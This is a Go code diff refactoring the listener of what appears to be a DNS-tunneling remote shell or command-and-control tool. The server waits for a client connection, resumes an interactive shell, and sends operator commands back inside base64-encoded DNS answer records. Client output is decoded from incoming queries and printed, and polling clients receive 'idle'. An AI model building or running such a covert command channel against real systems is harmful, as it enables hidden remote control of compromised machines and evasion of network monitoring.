@@ -16,16 +16,17 @@ func newDnsHandler(s *DNSServer) *dnsHandler {
 }
 
 type DNSServer struct {
-	port               string
-	handler            *dnsHandler
-	interactionHandler *interactionHandler
-	connectionHandler  *connectionHandler
-	messageHandler     *protocol.MessageHandler
+	port              string
+	handler           *dnsHandler
+	connectionHandler *connectionHandler
+	messageHandler    *protocol.MessageHandler
+	commandHandler    protocol.CommandHandler
 }
 
 func NewDnsServer(port string) *DNSServer {
-	d := &DNSServer{port: port, interactionHandler: newInteractionHandler(), connectionHandler: newConnectionHandler()}
+	d := &DNSServer{port: port, connectionHandler: newConnectionHandler()}
 	d.handler = newDnsHandler(d)
+	d.commandHandler = newListenerCommandHandler()
 	d.messageHandler = protocol.NewMessageHandler(encoder.NewBase64Encoder(), protocol.NewSimpleMessageSplitter())
 	return d
 }
@@ -33,7 +34,7 @@ func NewDnsServer(port string) *DNSServer {
 func (s *DNSServer) Initialize() {
 	server := s.createServer()
 	fmt.Println("Starting Listener on port '" + s.port + "'")
-	go s.interactionHandler.init()
+	go s.commandHandler.(*listenerCommandHandler).init()
 	err := server.ListenAndServe()
 	if err != nil {
 		fmt.Printf("Failed to start listener: %s\n", err.Error())
@@ -49,25 +50,46 @@ func (s *DNSServer) createServer() *dns.Server {
 	}
 }
 
+// ServeDNS todo: connection clock with timeout after 10 sec -> connection false, print sth, shell.Start()
 func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	if !h.server.connectionHandler.hasConnection {
-		//todo: print client addr here
 		h.server.connectionHandler.setConnectionStatus(true)
-		h.server.interactionHandler.shell.Resume()
+		//todo: print client addr here
+		fmt.Println("connected to {TBD}")
+		h.server.commandHandler.(*listenerCommandHandler).shell.Resume()
 	}
-	msg := h.server.createAnswerMessage(r)
-	h.server.writeMessage(w, msg)
+	h.server.handleMessage(w, r)
 }
 
-func (s *DNSServer) createAnswerMessage(r *dns.Msg) *dns.Msg {
-	msg := s.messageHandler.CreateAnswerMessage(r)
+func (s *DNSServer) handleMessage(w dns.ResponseWriter, r *dns.Msg) {
 	for _, question := range r.Question {
-		command := s.interactionHandler.handleCommand(question.Name, func() string {
-			return s.messageHandler.DecodeAnswerMsg(r)
-		}, func() { s.connectionHandler.hasConnection = false })
-		msg.Extra = s.messageHandler.BuildDNSExtra(command)
+		s.commandHandler.HandleCommand(question.Name, s.poll(w, r), s.answer(w, r), s.exit)
 	}
-	return msg
+}
+
+func (s *DNSServer) poll(w dns.ResponseWriter, r *dns.Msg) func() {
+	return func() {
+		s.sendAnswer(w, r, "idle")
+	}
+}
+
+func (s *DNSServer) answer(w dns.ResponseWriter, r *dns.Msg) func(command string) {
+	return func(command string) {
+		if command == "ok" {
+			fmt.Println(s.messageHandler.DecodeAnswerMsg(r))
+		}
+		s.sendAnswer(w, r, command)
+	}
+}
+
+func (s *DNSServer) exit() {
+	s.connectionHandler.hasConnection = false
+}
+
+func (s *DNSServer) sendAnswer(w dns.ResponseWriter, r *dns.Msg, command string) {
+	msg := s.messageHandler.CreateAnswerMessage(r)
+	msg.Extra = s.messageHandler.BuildDNSExtra(command)
+	s.writeMessage(w, msg)
 }
 
 func (s *DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
